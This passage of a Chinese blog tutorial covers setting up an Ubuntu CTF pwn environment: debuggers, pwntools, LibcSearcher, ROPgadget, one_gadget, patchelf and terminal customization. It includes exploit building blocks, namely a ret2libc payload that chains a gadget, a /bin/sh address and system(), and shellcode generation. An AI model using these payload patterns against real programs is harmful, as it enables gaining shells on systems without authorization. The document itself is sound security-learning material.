math等比较大的工具时，可用空间就不是特别的充足，这个时候倘若你刚好想做一道磁盘取证题，却发现磁盘太大不能够放入linux虚拟机中，可能会有点难受。\n虽然磁盘空间在装好虚拟机之后也能更改，但是需要虚拟机把所有的快照都删除掉，还是比较麻烦的。所以建议师傅们一开始就设置一个比较大的磁盘容量，反正是实际使用多少就占用多少空间的。\n2.关于打印机的一点坑：\n当创建好虚拟机时会有自定义硬件的选项，一开始默认会有打印机，最好移除打印机，如果没有移除打印机的话部分虚拟机可能会出现黑屏等问题。\n如果已经安装完了，也可以点编辑虚拟机设置移除打印机：\n3.关于连网的问题：\n# 检查联网情况，右键打开终端输入指令： ping baidu.com 如果连不上网的话可能需要自己查博客排查原因，实在不行就删掉重新再安装一次，第一次安装出一些小问题很正常，所以看教程的时候一定要做好每一步。\n4.关于软件源更换：\n不想在下载安装/更新软件时等比较长的时间的话最好还是换成国内的软件源吧。当然如果不想换的话也可以。我个人感觉换不换都没关系，大不了安装/更新软件时找一些其他的事干，比如看番/写博客文章的时候挂后台下载。\n（补充：“之前踩过阿里源的坑，官方源虽然慢了点，但是没有什么问题”——某师傅如是说）\n5.关于root：\nubuntu安装完之后root是需要我们手动设置密码的，不然不能切换为root用户。步骤如下：\n# 先用我们的初始用户右键打开终端， # 输入命令： sudo passwd # 输入新密码，并重复输入密码，最后提示成功更新即可 此时已完成root密码的设置\n6.关于共享文件夹：\n可以参考： Ubuntu共享文件夹的创建和使用 - 知乎 (zhihu.com)\n# 首先输入下面命令查看是否真的设置成功共享文件夹 # 不会设置的话就点上面的链接看一下就会了 vmware-hgfsclient # 进入共享文件夹 cd /mnt/hgfs/your_shareDir_name 关于工具安装的提醒：\n第一次接触 linux 的师傅们可以先去学习一些 linux 的基本操作再回来接着看 后续出现的所有名词如果有不懂的可以直接上搜索引擎查询，永远记住：搜索引擎是我们 CTFers 的好伙伴！ 建议大家在安装各种工具时多拍快照，安装错误后可以直接恢复到之前的快照 Ubuntu的虚拟机大小大概在30g~60g，大家平使用记得留足空间，快照基本都在1g以上，不用的快照及时删除，但是至少要留有一个快照！ 现在，开启我们的PWN环境搭建之旅吧，大概耗时30分钟~90分钟（具体看大家的linux熟练度和网速） 基础工具 # 一些比较基础的工具。\n1. vim\n这个文本编辑器可能新手不太常用，不过以后迟早会用到的，所以可以先安装好，反正不用花多少时间 [doge]\n# 安装 sudo apt install vim # 检测是否安装成功 #法一，不过打印(输出)出来的东西有点多 vim --version # 法二，不过需要看提示退出编辑器界面 vim -v 如何退出vim编辑器：\nvim退出时要先按 : (加shift变成冒号) ，看到光标到了底下再按q + enter退出，w + enter 保存后退出\n推荐阅读：\n精通 VIM ，此文就够了 - 知乎 (zhihu.com)\nLinux vi/vim | 菜鸟教程 (runoob.com)\n史上最全的Vim命令 （这个有点多，其实没必要，我只是放在这当书签🐶）\n2. git\n这个不多说了，必装\n# 安装 sudo apt install git # 检测是否安装成功 git --version 3. gcc\n这个也是必装的\n（学pwn的话是必须要学C语言的）\n# 安装 sudo apt install gcc # 检测是否安装成功 gcc -v qemu （Kernel Pwn） # （刚入门pwn的师傅可能不太常用，不过也可以先装着）\n# 安装 # (这里我直接采用了qemu官方的安装方式，大约有1G的包需要下载，所以网速很重要doge) sudo apt-get install qemu-user qemu-system # 检测是否安装成功 qemu-system-arm -M ? qemu的详细安装过程与使用方法可以看：\n5. python3 与 pip3\nubuntu 已经默认装好了python3，如果想用python2的话可以自己装，不过现在已经不推荐用python2了\n# 安装pip3 sudo apt install python3-pip # 检测是否安装成功 pip -V # 设置python命令默认为python3 sudo apt install python-is-python3 # 安装前会显示找不到命令 “python”，安装后可以正常使用python指令 # 其实安装这个软件包只是为了少打那个“3”,所以也可以不装[doge] gdb 插件 # 前排提示：PWNer 必须学会使用 gdb！！！\n（ubuntu默认装有普通的gdb，其实也不是不能直接用，不过还是安装一些插件比较好）\n1. peda\n# 原版 git clone https://github.com/longld/peda.git echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt; ~/.gdbinit # 带heap插件版 git clone https://gitee.com/AC_ddme/peda-heap.git echo \u0026#34;source ~/peda-heap/peda.py\u0026#34; \u0026gt; ~/.gdbinit # 测试： gdb ### peda-heap 使用方法 heap set_mainarena [new_addr] # -- set main_arena = newvalue heap all # -- print heap info (mmap + sbrk) heap freed [main_arena] # -- print freed chunks (tcache + fastbinY + bins) heap fastbin [main_arena] # -- print freed chunks(fastbinY) heap bins [main_arena] # -- print freed chunks (bins) heap trace # -- print (arg + return_value) of malloc,free,realloc heap checkfree address # -- try free chunk at address and print some info heap debug + heap restore # -- try restore heap state before it was overlapped ### heap all 如下图： 2. pwndbg\n# (时间较长) git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # 测试： gdb 3. gef\n# git git clone https://github.com/hugsy/gef.git echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit # 测试： gdb 三个插件使用指南\n平时使用方式一：（注释法）\nsudo vim ~/.gdbinit # vim后参照第一行的内容，在文件内输入下方横线中内容 #（注意每个人的路径是不同的，所以要输入的内容也是不同的） # 选择你要用的一个，另外两个注释掉，保存退出 # 原来： source ~/pwndbg/gdbinit.py source ~/gef/gef.py source ~/peda/peda.py source ~/peda-heap/peda.py\u0026#34; ### 使用pwndbg: source ~/pwndbg/gdbinit.py # source ~/gef/gef.py # source ~/peda/peda.py # source ~/peda-heap/peda.py\u0026#34; 平时使用方式二：（多打一行命令法：）\n# 使用前多打一行命令 # 路径需要根据自己的安装路径更改 ### 使用pwndbg: echo \u0026#34;source ~/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit gdb ### 使用gef: echo \u0026#34;source ~/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit gdb ### 使用peda: echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gdb ### 使用peda-heap: echo \u0026#34;source ~/peda-heap/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gdb 在exp脚本中调用gdb调试时，可以自己写一个函数来解决，比如：\nfrom pwn import * taolve = process(\u0026#39;./pwn\u0026#39;) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) #使用pwndbg,其他同理 _gdb(1) 4. gdb-multiarch（可选）\n（目前可能还用不到，大家可以先跳过）\n以下为ARM和MIPS的交叉编译及运行环境，安装可参考 hollk 大佬的文章：\nubuntu20.04 PWN（含x86、ARM、MIPS）环境搭建\ngdb-multiarch gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 ARM PWN —— ARM软件包 MIPS PWN —— MIPS软件包 python PWN 相关库\npwntools # （ps：后面的工具比较多，可以专门在根目录上新建一个tools文件夹来放工具）\n# pip3直接安装： sudo apt-get update sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools # 先git下来再用pip3安装：（好像法2会快一些） git clone https://github.com/Gallopsled/pwntools.git sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools # 检测是否安装成功 python3 from pwn import * # 没有报错就说明装好了 注：输入 quit() 退出Python交互模式\n又注：之前用户名为\u0026quot;pwner\u0026quot;的虚拟机是入门时用到现在的老虚拟机，还是默认背景和配色，用户名为\u0026quot;ta0lve\u0026quot;的虚拟机是今天刚装的新虚拟机，个性化配置见本文的最后： terminator （可选）\n基本使用方法：\n# python3 from pwn import * # 导入python库 ### 0x01 环境设置 # 1 context.log_level = \u0026#39;debug\u0026#39; # 在对漏洞进行故障排除 context.arch = \u0026#39;i386\u0026#39; context.os = \u0026#39;linux\u0026#39; # 2 context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # 3 context.binary = pwn_name # 从二进制文件推断目标架构、位与和字节序 ### 0x02 建立链接 io = remote(ip,port) # 创建与ip:port的链接 p = process(pwn_name) # 执行二进制文件process gdb.attach(p) # 在当前进程下调试二进制文件 ### 0x03 利用elf文件 elf = ELF(pwn_name) # 封装有关 ELF 文件的信息 func_addr = elf.sym[\u0026#34;func\u0026#34;] # 在ELF文件中查找函数的加载地址 func_got = elf.got[\u0026#34;func\u0026#34;] # 在ELF文件中查找函数的got表地址 func_plt = elf.plt[\u0026#34;func\u0026#34;] # 在ELF文件中查找函数的plt表地址 binsh_addr = elf.search(b\u0026#39;/bin/sh\u0026#39;).__next()__ # 在ELF文件中查找字符串 binsh_addr = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 这个写法也可以 ### 0x04 利用本地libc文件 libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) libc_base = puts_real_addr - libc.symbols[\u0026#39;puts\u0026#39;] binsh_addr = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() # binsh_addr = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 这个写法也可以 system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] ### 0x05 查找libc文件 from LibcSearcher import * libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) ### 0x06 生成shellcode shellcode = shellcraft.sh() # 生成指定架构的shellcode 汇编语言 shellcode = asm(shellcode) # 转换为字节 ### 0x07 接收发送字节 p.recv(size) # 接收 size 个字节 默认全部接收 p.recvline() # 接收字节直至遇到b\u0026#39;\\n\u0026#39; p.recvuntil(string) # 接受字节直到遇到 string p.send(data) # 发送 data p.sendline(data) # 发送 data 在后面加 b\u0026#39;\\n\u0026#39; p.sendafter(data) # 在接收 string 后发送data p.sendlineafter(string,data) # 在接收 string 后发送data 在后面加 \u0026#39;\\n\u0026#39; p64(data) # 将 data 转换为64位小端序字节 也可以为32/16/8位字节 u64(data) # 将 data 转换为64位大端序字节 也可以为32/16/8位字节 ### 0x08 创建一个交互shell p.interactive() 还可以看看：\npwntools的安装及基本使用\npwntools — pwntools 4.10.0 documentation\nLibcSearcher # # 安装方式一： sudo pip3 install LibcSearcher # 可以多试几次，实在不行可以使用方式二 # 方式二如果在使用时出现“No Moudule Name LibcSearcher”， # 可以将exp.py文件复制到LibcSearcher根目录下， # 或是将LibcSearcher.py复制到exp.py文件所在的文件夹下 # 安装方式二： git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher sudo python3 setup.py install # 检测是否安装成功 python3 from LibcSearcher import * （如果两个方法都不行可以看一看这个： LibcSearcher安装的心路历程和坑）\n基本使用方法：（还没入门的师傅们可以等学到ret2libc的时候再看）\nfrom pwn import * from LibcSearcher import * # 接收函数的got表的地址,比如我这里拿到puts函数的真实地址 puts_real_addr = u64(taolve.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) log.success(\u0026#34;puts_real_addr:\u0026#34;+ hex(puts_real_addr)) # 打印出来给自己看一看 libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc.add_condition(\u0026#34;atoi\u0026#34;, 218528) # 添加一个约束条件 libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) # 养成好习惯，打印一下libc_base看看是不是后三位为0 log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # 构造payload, 准备getshell payload = b\u0026#34;a\u0026#34;*offset + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) #+p64(vuln) 注：其实大家装一个LibcSearcher库就够用了，后面几个库可以直接跳过\nLibcSearcher3 （可选）\n# 安装 pip3 install LibcSearcher3 # 检测是否安装成功 python3 from LibcSearcher3 import * 相关说明：\nLibcSearcher3 · PyPI\nLibcSearcherX （可选）\n（这个我没装）\niptL-F4ck/LibcSearcherX (github.com)\npwnmodules （可选）\n（这个我也没装 🐶 ）\nPwnModules · PyPI\n在线查找libc库：\nlibc-database\nlibc database search (blukat.me)\nPWN 相关工具 # 现在不知道怎么用、什么时候用很正常，可以先装好，反正以后迟早会用到的[doge]\n当然也可以先标记一下等到时候有需要再回来看。\nROPgadget # 该工具允许在二进制文件中搜索小工具，以促进对ROP的利用。ROPgadget支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS架构下的ELF/PE/Mach-O格式\n完成基本ROP题型时方便我们构造ROP链\n# 安装 sudo pip3 install capstone git clone https://github.com/JonathanSalwan/ROPgadget.git cd ROPgadget sudo python3 setup.py install # 检测是否安装成功 ROPgadget -V 如果报错了，可以按下面的方法解决：\n# 报错详情： ...Error: Script \u0026#39;scripts/ROPgadget\u0026#39; not found in metadata at \u0026#39;/home/ta0lve/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info\u0026#39; # 复制这个报错的路径 # 解决： cd ROPgadget # 进入你们git的目录里，已经进去了就不用输这个命令了 sudo cp -r scripts 你复制的路径 # 示例： sudo cp -r scripts /home/ta0lve/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info 基础用法：\n# 其中的pwn是我们的二进制文件 ROPgadget --binary pwn --only \u0026#34;pop|ret\u0026#34; | grep rax ROPgadget --binary pwn --only “int” ROPgadget --binary pwn --string \u0026#34;/bin/sh\u0026#34; # 辨析： ROPgadget --binary pwn | grep ret # 含有ret指令的都符合 ROPgadget --binary pwn --only \u0026#34;ret\u0026#34; # 只含有ret指令的 # ROPgadget自动生成ropchain ROPgadget --binary pwn --ropchain one_gadget # 在ctf-pwn中大部分情况需要获得远程shell，one_gadget会自动查找ELF文件中的execve(‘/bin/sh’, NULL, NULL)，通过exploit实现RCE（远程代码执行）\n查找可以用来 getshell 的指令\n# 安装 sudo apt install -y ruby ruby-dev sudo gem install one_gadget # 检测是否安装成功 one_gadget --version 基础用法：\none_gadget libc.so.6 \u0026#34;\u0026#34;\u0026#34; 输出： 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL \u0026#34;\u0026#34;\u0026#34; glibc-all-in_one # glibc-all-in-one 是一个开源项目，里面有各种版本的glibc 源码。\n## git安装 git clone https://github.com/matrix1001/glibc-all-in-one cd glibc-all-in-one sudo python3 update_list ## 使用 # 获取可以更新的glibc的版本 ./update_list # 查看可下载的glibc cat list # glibc为要下载glibc的名字 #（题目应该会有提示，或者ida里面也有相关信息） sudo ./download glibc ## 示例： sudo ./download 2.23-0ubuntu11.3_amd64 ## 关于 old_list文件： # old_list中的是过时的glibc文件，一般不会用到， # 如果需要下载old_list里面对应的glibc， # 要用./download_old进行下载操作。（用./download会报错） 下载好之后目录里ld.so文件是链接器，libc.so文件是glibc文件\npatchelf # 用于修改现有ELF可执行文件和库的简单实用程序\n非常实用的一个工具！\n# 安装 sudo apt install patchelf # 检测是否安装成功 patchelf --version 基础用法：\n## 其中的pwn是我们的二进制文件 # 更换链接器 ld.so 文件 patchelf --set-interpreter ld的硬路径 ./pwn # 直接选择 glibc libc.so 文件 patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn # 更换glibc搜索路径： patchelf --set-rpath glibc-all-in-one下载的文件夹 ./pwn # 查看elf的ld和libc ldd ./pwn ## 示例： patchelf --set-interpreter ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./pwn patchelf --replace-needed libc.so.6 ./libc-2.23.so ./pwn patchelf --set-rpath ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./pwn # 检查： ldd ./pwn 如果觉得太麻烦了，其实也可以直接在exp里面指定：\n# 利用pwntools加载不同版本libc调试程序 # 这个方法最好将链接器ld.so和题目给我们的libc.so复制到当前目录下 taolve = process([\u0026#34;ld.so\u0026#34;, \u0026#34;./pwn\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;libc.so.6\u0026#34;}) # 示例：(这是我常用的脚本开头部分) from pwn import * from LibcSearcher3 import * is_debug = 1 is_remote = 0 # is_remote == 2时可以利用pwntools加载不同版本libc调试程序 is_gdb = 0 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;ip\u0026#34;, post) elif is_remote == 2: taolve = process([\u0026#34;./ld-2.23.so\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) else: taolve = process(\u0026#39;./pwn\u0026#39;) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) _gdb(is_gdb) 推荐阅读：\nCTF pwn中利用pwntools加载不同版本libc调试程序的方法\npwn相关命令补充： # （这些命令都是linux自带的，只是过一下一些比较常用的命令）\nstrings的使用\n# 搜索字符串 strings pwn \u0026#34;ctf\u0026#34; # 查看一个libc的版本(看使用什么版本的连接器) strings libc.so.6 |grep GLIBC \u0026#34;\u0026#34;\u0026#34; 输出： GLIBC_2.2.5 GLIBC_2.2.6 ... GLIBC_2.23 GLIBC_PRIVATE GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al. \u0026#34;\u0026#34;\u0026#34; # 所以这个 libc.so 文件是2.23版本的 # 使用 2.23-0ubuntu11.3 的链接器 # ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so objdump 的使用\nobjdump命令，一般用于显示二进制文件的信息\n# 其中的pwn是我们的二进制文件 # 示例图就不放了，师傅们可以直接在自己的linux里执行一下看看 # 整体信息 objdump -f pwn # 所有段 objdump -p pwn # 所有节 objdump -h pwn # 所有段 + 所有节 + 所有符号 objdump +x pwn # 可执行部分并反汇编 objdump -d pwn # 所有节反汇编 objdump -D pwn # 显示所有节的 16 进制内容（可看 got 表） objdump -s pwn # 符号表 objdump -t pwn # 动态符号表 objdump -T pwn # 重定位信息 objdump -R pwn # 仅反汇编指定的section。可以有多个-j参数来选择多个section -j section # 指定节的内容 objdump -s -j .got pwn 以下是我个人比较常用的，欢迎师傅们补充：\n# 查看plt符号表的调用地址 objdump -d pwn | grep \u0026#34;plt\u0026#34; objdump -R pwn objdump -s -j .got pwn 关于objdump的其他反汇编命令的使用，可阅读：\nobjdump反汇编命令使用指南\nreadelf 的使用\nreadelf命令，一般用于查看ELF格式的文件信息\n# 示例： readelf pwn -h -a , --all 显示全部信息,等价于 -h -l -S -s -r -d -V -A -I 。 -h , --file-header 显示 elf 文件开始的文件头信息. -l , --program-headers , --segments 显示程序头（段头）信息(如果有的话)。 -S , --section-headers , --sections 显示节头信息(如果有的话)。 -g , --section-groups 显示节组信息(如果有的话)。 -t , --section-details 显示节的详细信息( -S 的)。 -s , --syms , --symbols 显示符号表段中的项（如果有的话）。 -e , --headers 显示全部头信息，等价于: -h -l -S -n , --notes 显示 note 段（内核注释）的信息。 -r , --relocs 显示可重定位段的信息。 -u , --unwind 显示 unwind 段信息。当前只支持 IA64 ELF 的 unwind 段信息。 -d , --dynamic 显示动态段的信息。 -V , --version-info 显示版本段的信息。 -A , --arch-specific 显示 CPU 构架信息。 -D , --use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。 -x , --hex-dump= 以16进制方式显示指定段内内容。 number 指定段表中段的索引,或字符串指定文件中的段名。 -w[liaprmfFsoR] or –debug-dump[=line,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges] 显示调试段中指定的内容。 -I , --histogram 显示符号的时候，显示 bucket list 长度的柱状图。 -v , --version 显示 readelf 的版本信息。 -H , --help 显示 readelf 所支持的命令行选项。 -W , --wide 宽行输出。 参考： Linux命令学习手册-readelf checksec\n这个命令可以识别二进制文件的安全属性 ，即检测我们的二进制程序的保护机制的开关情况，可以在Linux中安装，也可以在三个gdb插件中直接使用。\n不过gdb中的checksec版本较老，检测的保护机制种类较少，所以还是建议大家都安装一个\n# 安装后在终端命令行中使用 sudo apt install checksec checksec --file=pwn # 在带插件的gdb中使用 gdb pwn checksec seccomp-tools # seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall，这是不安全的，比如劫持程序流后通过execve的syscall来getshell。通过seccomp我们可以在程序中禁用掉某些syscall，这样就算劫持了程序流也只能调用部分的syscall了\nseccomp-tools项目旨在(但不限于)分析CTF pwn挑战中的seccomp沙盒。有些特性可能是特定于ctf的，但对于分析真实情况下的seccomp仍然有用\n用于分析沙盒的工具\n# 安装 sudo gem install seccomp-tools # 检测是否安装成功 seccomp-tools --version # 使用： seccomp-tools dump ./pwn # 可以知道哪些syscall被系统被禁用 main_arena_offset（可跳） # 用来计算 main_arena 的偏移工具\n# 安装 git clone https://github.com/bash-c/main_arena_offset.git cd main_arena_offset # 检测是否安装成功 ./main_arena /lib/x86_64-linux-gnu/libc.so.6 也可以用 dev2ero 库中封装的 py_main_arena_offsetpy 模块来计算main_arena的偏移。\nfrom pymao import * libc = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; main_arena_offset = gmao(blic) main_arena_offset Crypto 相关工具（可跳） # 累了，我先挖个坑，下次再更新 _(:з」∠)_\ngym2\nsage math（Crypto）\n优化体验的相关配置 # Oh-My-Zsh （可选） # # 安装： git clone https://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # 更改你的默认 Shell： chsh -s /bin/zsh 使用参考：\nOh-My-Zsh的配置与使用\nterminator （可选） # 一个终端软件，只是用来优化体验的（毕竟打pwn的话以后可能会较为频繁地使用终端），赶时间的师傅可以跳过~\n# 安装： sudo apt update sudo apt install terminator # 自定义： cd ~/.config/terminator/ sudo gedit config # 注意这个config文件以及terminator文件夹可能一开始不存在， # 可以自己新建文件夹再创建.一样会生效的 常用快捷键：\n（操作方面）\nCtrl + Shift + C 复制\nCtrl + Shift + V 粘贴\nCtrl + Shift + F 在当前窗口搜索\nCtrl + Shift + G 清屏\nCtrl + Shift + N 或者 Ctrl + Tab 在分割的各窗口之间切换\nCtrl + Shift + W 关闭当前终端\nCtrl + Shift + Q 关闭所有终端（退出程序）\nCtrl + Alt + T 启动终端（不安装terminator则是Ubuntu自带的terminal）\n（窗口方面）\nF11 全屏\nCtrl + Shift + O 水平分割终端（分成上下两个窗口）\nCtrl + Shift + E 垂直分割终端（分成左右两个窗口）\nCtrl + Shift + Right/Left 在垂直分割的终端中将分割条向右/左移动\nCtrl + Shift + X 放大（还原）当前终端（将分割的某一个窗口放大至全屏使用）\nCtrl + Shift + S 隐藏/显示滚动条\nCtrl + Shift + Z 从放大至全屏的某一窗口回到多窗格界面\n（其他快捷键）\nSearch for a Keyword – Ctrl+Shift+f（好用的搜索功能）\nMove to Next Terminal – Ctrl+Shift+N or Ctrl+Tab\nMove Parent Dragbar Right – Ctrl+Shift+Right_Arrow_key\nMove Parent Dragbar Left – Ctrl+Shift+Left_Arrow_key\nMove Parent Dragbar Up – Ctrl+Shift+Up_Arrow_key\nMove Parent Dragbar Down – Ctrl+Shift+Down_Arrow_key\nHide/Show Scrollbar – Ctrl+Shift+s\nMove to the Above Terminal – Alt+Up_Arrow_Key\nMove to the Below Terminal – Alt+Down_Arrow_Key\nMove to the Left Terminal – Alt+Left_Arrow_Key\nMove to the Right Terminal – Alt+Right_Arrow_Key\nCopy a text to clipboard – Ctrl+Shift+c\nPaste a text from Clipboard – Ctrl+Shift+v\nClose the Current Terminal – Ctrl+Shift+w\nQuit the Terminator – Ctrl+Shift+q\nToggle Between Terminals（切换终端） – Ctrl+Shift+x\nOpen New Tab – Ctrl+Shift+t\nMove to Next Tab – Ctrl+page_Down\nMove to Previous Tab – Ctrl+Page_up\nIncrease Font size – Ctrl+(+)\nDecrease Font Size – Ctrl+(-)\nReset Font Size to Original – Ctrl+0\nToggle Full Screen Mode – F11\nReset Terminal – Ctrl+Shift+R\nReset Terminal and Clear Window – Ctrl+Shift+G\nRemove all the terminal grouping – Super+Shift+t\nGroup all Terminal into one – Super+g\nconfig 文件内容可以照搬：\n（我们还可以顺便把桌面背景给换了，这样终端设置为透明的就有一个背景了）\n# 示例1：(如果直接复制粘贴不行就把注释删掉) [global_config] handle_size = -3 title_transmit_fg_color = \u0026#34;#000000\u0026#34; title_transmit_bg_color = \u0026#34;#3e3838\u0026#34; inactive_color_offset = 1.0 enabled_plugins = CustomCommandsMenu, LaunchpadCodeURLHandler, APTURLHandler, LaunchpadBugURLHandler suppress_multiple_term_dialog = True [keybindings] [profiles] [[default]] background_color = \u0026#34;#373737\u0026#34; background_darkness = 0.8 background_type = transparent cursor_shape = ibeam cursor_color = \u0026#34;#e8e8e8\u0026#34; font = Ubuntu Mono 14 foreground_color = \u0026#34;#e8e8e8\u0026#34; copy_on_selection = True # 选择文本时同时将数据拷贝到剪切板中,强烈推荐 show_titlebar = False scroll_background = False scrollback_lines = 3000 palette = \u0026#34;#292424:#5a8e1c:#00ff00:#cdcd00:#1e90ff:#cd00cd:#00cdcd:#d6d9d4:#4c4c4c:#868e09:#00ff00:#ffff00:#4682b4:#ff00ff:#00ffff:#ffffff\u0026#34; use_system_font = False [layouts] [[default]] [[[child1]]] parent = window0 profile = default type = Terminal [[[window0]]] parent = \u0026#34;\u0026#34; size = 925, 570 type = Window [plugins] # 示例2：(如果直接复制粘贴不行就把注释删掉) [global_config] title_transmit_bg_color = \u0026#34;#d30102\u0026#34; focus = system suppress_multiple_term_dialog = True [keybindings] [profiles] [[default]] palette = \u0026#34;#2d2d2d:#f2777a:#99cc99:#ffcc66:#6699cc:#cc99cc:#66cccc:#d3d0c8:#747369:#f2777a:#99cc99:#ffcc66:#6699cc:#cc99cc:#66cccc:#f2f0ec\u0026#34; background_color = \u0026#34;#2D2D2D\u0026#34; # 背景颜色 background_image = None background_darkness = 0.85 cursor_color = \u0026#34;#2D2D2D\u0026#34; # 光标颜色 cursor_blink = True # 光标是否闪烁 foreground_color = \u0026#34;#EEE9E9\u0026#34; # 文字的颜色 use_system_font = False # 是否启用系统字体 font = Ubuntu Mono 13 # 字体设置，后面的数字表示字体大小 copy_on_selection = True # 选择文本时同时将数据拷贝到剪切板中 show_titlebar = False # 不显示标题栏，也就是 terminator 中那个默认的红色的标题栏 [layouts] [[default]] [[[child1]]] type = Terminal parent = window0 profile = default [[[window0]]] type = Window parent = \u0026#34;\u0026#34; [plugins] 示例1截图：（也是我自己的桌面）\n背景图片（可能加载有点慢）：\n参考链接：\nUbuntu中终端分屏工具terminator的安装和使用\nTerminator的安装和配置(颜色和字体)\nterminator安装、美化、使用及闪退解决\nTerminator终端的安装，配置以及如何修改默认终端\nOthers # 在Ubuntu中右键菜单添加自定义命令 # 右键菜单添加自定义命令 # 本文以添加右键打开terminator为例 # 1.进入~/.local/share/nautilus/scripts文件夹 cd ~/.local/share/nautilus/scripts # 2.创建文件 vim open_terminator #文件名\u0026#34;open_terminator\u0026#34;作为右键菜单Scripts的二级菜单名 # 3.添加相应脚本（下面两行为脚本的内容） #!/bin/bash terminator # 4.保存退出 :wq # 5.赋予权限 sudo chmod u+x open_terminator 参考链接： (5条消息) Ubuntu18.04添加右键菜单_ubuntu nautilus修改右键_CHAOS_ORDER的博客-CSDN博客\n在Ubuntu中右键以管理员身份打开文件夹或编辑文件 方便刚接触Linux系统的师傅们在图形化界面的操作体验，不过还是建议师傅们尽早熟悉使用命令行\n# 右键单击文件并选择“以管理员身份编辑” sudo apt install nautilus-admin # 安装扩展后，您需要重新启动文件管理器以应用更改。 # 不仅关闭并重新打开文件管理器窗口， # 还需要运行命令退出后台服务并让它自动重新启动： nautilus -q 在Ubuntu中右键新建模版文档 ubuntu系统（22.04）下右键默认是没有新建文档（文本文档、office等）功能的。\n但可以手动添加。\n1、 在主目录下找到模板文件夹，这时候文件夹里面是空的。\n2、 打开文本文档，保存为一个新的空白文档（命名为Txt 